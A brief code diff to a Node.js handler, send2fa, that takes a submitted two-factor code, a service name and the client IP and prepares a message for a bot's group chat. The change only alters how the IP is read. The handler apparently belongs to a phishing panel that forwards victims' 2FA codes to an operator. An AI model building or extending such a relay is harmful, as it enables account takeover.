@@ -2,7 +2,7 @@ const {bot, groupID} = require('../index');
 
 const send2fa = async(req, res) => {
     const {twoFa, service} = req.body;
-    const ip = req.ip || req.connection.remoteAddress;
+    const ip = req.clientIp;
     const keyboard = {
         parse_mode: 'Markdown',
         reply_markup: {
